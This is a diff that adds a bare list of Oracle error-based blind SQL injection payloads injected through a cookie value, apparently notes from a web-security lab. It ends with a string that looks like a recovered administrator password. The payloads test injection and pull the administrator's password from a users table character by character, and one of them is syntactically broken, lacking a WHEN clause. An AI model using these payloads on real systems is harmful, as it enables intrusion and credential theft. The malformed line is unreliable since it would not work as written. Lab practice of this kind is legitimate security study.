@@ -1,0 +1,7 @@
+cookie'--
+
+cookie' || (SELECT CASE WHEN(1=1) THEN to_char(1/0) ELSE ' ' END FROM dual)--
+
+cookie' || (SELECT CASE substr(password,1,1) THEN to_char(1/0) ELSE ' ' END FROM users where username = 'administrator')--
+
+xx30kt5l66iytpa9797r
